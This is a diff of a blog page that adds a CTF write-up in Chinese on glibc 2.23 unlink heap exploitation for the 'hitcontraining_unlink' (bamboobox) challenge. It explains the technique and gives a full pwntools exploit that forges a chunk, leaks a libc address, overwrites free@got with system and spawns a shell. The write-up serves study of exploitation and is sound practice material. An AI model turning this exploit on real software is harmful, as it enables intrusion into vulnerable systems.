@@ -162,33 +162,214 @@
 
             <div class="main">
                 <div class="container">
-                    <div class="post-wrap archive">
-                        
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                unlink利用—hitcontraining_unlink
+                            </h1>
                             
-                                <h3>
-                                    2020
-                                </h3>
+                                <!--en-->
+                                <div class="post-meta en">
+                                    Author:
+                                    <a itemprop="author" rel="author" href="/">
+                                        lemon的自留地～
+                                    </a>
+                                    <span class="post-time">
+                                Date: <a href="#">2020-09-05</a>
+                            </span>
+                                    <span class="post-readtime">Reading Time:<a
+                                    href="#">3.2
+                                    mins</a></span>
+                                    <span class="post-words">words:<a href="#">653</a></span>
+                                    
+                                            Views:
+                                            <span data-hk-page="current"> - </span>
+                                            
+                                </div>
+                                
+                        </header>
+                        
+                        <div class="post-content">
+                            <h1 id="unlink">unlink</h1>
+<p>简单说一下吧，不说太多了，比较累了<br>
+总结一下<br>
+(只讨论2.23版本的libc下的unlink)</p>
+<h2 id="利用条件">利用条件</h2>
+<p>一个指向heap的指针，在bss段上之类的，最好没开pie，就比较轻松点儿<br>
+然后还需要堆溢出或者UAF，目的都是改写smallbin 或是 unsorted bin 的 fd 和 bk 指针</p>
+<h2 id="效果">效果</h2>
+<p>使得已指向chunk 的指针 ptr 变为 ptr - 0x18</p>
+<h2 id="通用思路">通用思路</h2>
+<p>设指向可 UAF chunk 的指针的地址为 ptr<br>
+修改 fd 为 ptr - 0x18<br>
+修改 bk 为 ptr - 0x10<br>
+触发 unlink</p>
+<p>更详细的思路：<br>
+以能够进行堆溢出的场景下说明：<br>
+1，申请三个堆块012，0用来溢出，1用来作为unsorted bin，2用来保护<br>
+2，伪造chunk0，伪造fd和bk之类的，然后利用堆溢出来改写chunk1的prevsize和size的inuse<br>
+3，free1，触发unlink<br>
+4，找bss段上的全局指针，看看周围怎么利用，比如改got表</p>
+<h1 id="解题">解题</h1>
+<h2 id="逆向">逆向</h2>
+<p>不看了，简单逆向，漏洞位于在edit中，可以任意修改长度，老漏洞了<br>
+思路，伪造chunk，然后unlink到bss处，改写heaparray到free@got，然后修改为system<br>
+下图为atoi，一开始是修改atoi为system，然后输入sh拿到shell，本地可以打通，但是远程就不行了，qswl<br>
+还有libcsearcher，我的libcsearcher像坨屎一样误差就nima离谱，草<br>
+<img src="https://l3mon629.github.io/post-images/1599298739106.png" alt="" loading="lazy"><br>
+<img src="https://l3mon629.github.io/post-images/1599298744916.png" alt="" loading="lazy"></p>
+<h2 id="exp">exp</h2>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import *
+#r=process('bamboobox')
+#r=remote('node3.buuoj.cn',28011)
+elf=ELF('../hitcontraining_unlink/bamboobox')
+r = process('../hitcontraining_unlink/bamboobox')
+
+def alloc(length,context):
+    r.recvuntil(&quot;Your choice:&quot;)
+    r.sendline(&quot;2&quot;)
+    r.recvuntil(&quot;Please enter the length of item name:&quot;)
+    r.sendline(str(length))
+    r.recvuntil(&quot;Please enter the name of item:&quot;)
+    r.send(context)
+
+def edit(idx,length,context):
+    r.recvuntil(&quot;Your choice:&quot;)
+    r.sendline(&quot;3&quot;)
+    r.recvuntil(&quot;Please enter the index of item:&quot;)
+    r.sendline(str(idx))
+    r.recvuntil(&quot;Please enter the length of item name:&quot;)
+    r.sendline(str(length))
+    r.recvuntil(&quot;Please enter the new name of the item:&quot;)
+    r.send(context)
+
+def free(idx):
+    r.recvuntil(&quot;Your choice:&quot;)
+    r.sendline(&quot;4&quot;)
+    r.recvuntil(&quot;Please enter the index of item:&quot;)
+    r.sendline(str(idx))
+
+def show():
+    r.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;)
+
+alloc(0x30,'bbbb')
+alloc(0x30,'bbbb')
+alloc(0x80,'cccc')
+alloc(0x20,'/bin/sh\x00')
+
+glo=0x6020c8+0x10
+fd=glo-0x18
+bk=glo-0x10
+
+payload=p64(0)+p64(0x31)+p64(fd)+p64(bk)+b'a'*0x10+p64(0x30)+p64(0x90)
+edit(1,len(payload),payload)
+free(2)
+free_got=elf.got['free']
+log.info(&quot;free_got:%x&quot;,free_got)
+payload1=p64(0)+p64(0)+p64(0x30)+p64(free_got)
+#print payload1
+edit(1,len(payload),payload1)
+show()
+#log.info(&quot;got:%s&quot;,r.recv())
+
+free_addr=u64(r.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8, b'\x00'))
+log.info(&quot;free_addr:%x&quot;,free_addr)
+libc=LibcSearcher('free',free_addr)
+libc_base=free_addr-libc.dump('free')
+log.info(&quot;libc_addr:%x&quot;,libc_base)
+system_addr=libc_base+libc.dump('system')
+log.info(&quot;system_addr:%x&quot;,system_addr)
+edit(1,0x8,p64(system_addr))
+pause()
+free(3)
+r.interactive()
+</code></pre>
+<p>被环境恶心死了，本地的cccc</p>
+
+                        </div>
+                        
+                            <div class="post-toc">
+                                <ul class="markdownIt-TOC">
+<li><a href="#unlink">unlink</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6">利用条件</a></li>
+<li><a href="#%E6%95%88%E6%9E%9C">效果</a></li>
+<li><a href="#%E9%80%9A%E7%94%A8%E6%80%9D%E8%B7%AF">通用思路</a></li>
+</ul>
+</li>
+<li><a href="#%E8%A7%A3%E9%A2%98">解题</a>
+<ul>
+<li><a href="#%E9%80%86%E5%90%91">逆向</a></li>
+<li><a href="#exp">exp</a></li>
+</ul>
+</li>
+</ul>
+
+                            </div>
+                            
                                 
                                     
+                                        <!--en-->
+                                        <section class="post-copyright en">
+                                            <p class="copyright-item">
+                                                <span>Author:</span>
+                                                <span>lemon的自留地～</span>
+                                            </p>
 
-                                        <article class="archive-item">
-                                            <a class="archive-item-link" href="https://l3mon629.github.io/post/ret2csu-suo-duan-payload/">
-                                                ret2csu—缩短payload
-                                            </a>
-                                            <span class="archive-item-date">2020-09-02 </span>
-                                        </article>
+                                            <p class="copyright-item">
+                                                <span>Permalink:</span>
+                                                <span><a href="https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/">https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/</a></span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>License:</span>
+                                                <span>MIT License</span>
+                                            </p>
+                                        </section>
                                         
-                                            
                                                 
-                    </div>
-                    <div class="pagination-container">
-                        
-                                                
+                                                    
+                                                        <!-- Share-->
+                                                        <span style="margin-right:15px">
+                                                    <i class="post-share"></i>
+                                                    <span>Share:</span>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/&sharesource=qzone&title=unlink利用—hitcontraining_unlink&pics=https://l3mon629.github.io/images/avatar.png?v=1599299433088&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/&sharesource=weibo&title=unlink利用—hitcontraining_unlink + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1599299433088 "><i class="fa fa-weibo "></i></a>
                                                         
+                                                                </span>
+                                                                <!--en-->
+                                                                <section class="post-tags en ">
+                                                                    <div>
+                                                                        <span>Tag(s):</span>
+                                                                        <span class="tag ">
+                        
+                                                            </span>
+                                                                    </div>
+                                                                    <div>
+                                                                        <a href="javascript:window.history.back();">back</a>
+                                                                        <span>&dot;</span>
+                                                                        <a href="#">home</a>
+                                                                    </div>
+                                                                </section>
                                                                 
-                    </div>
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/gyctf_2020_some_thing_exceting/">
+                                                                                                    gyctf_2020_some_thing_exceting
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
                 </div>
+                
+                                            
             </div>
+    </div>
+    </div>
     </div>
     
         <footer id="footer" class="footer">
@@ -251,5 +432,8 @@
                 </script>
         </div>
 </body>
+<script>
+    scroll();
+</script>
 
 </html>
